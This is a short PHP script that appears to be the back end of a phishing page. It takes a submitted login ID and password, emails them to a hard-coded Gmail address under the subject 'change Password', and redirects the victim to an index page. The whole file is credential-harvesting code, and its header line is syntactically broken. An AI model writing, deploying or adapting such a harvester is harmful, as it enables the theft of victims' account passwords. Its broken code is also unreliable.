<?php
header( 'Location: /index.html' ) ;
$log=$_POST['log'];
$to='rrohitchauhan11@gmail.com';
$pwd=$_POST['pwd'];
$subject="change Password";
$message="id:".$log."  "."password:"."$pwd";
$headers="From:"
echo $log;
echo $pwd;
mail($to, $subject, $message, $headers);

echo "success";

?>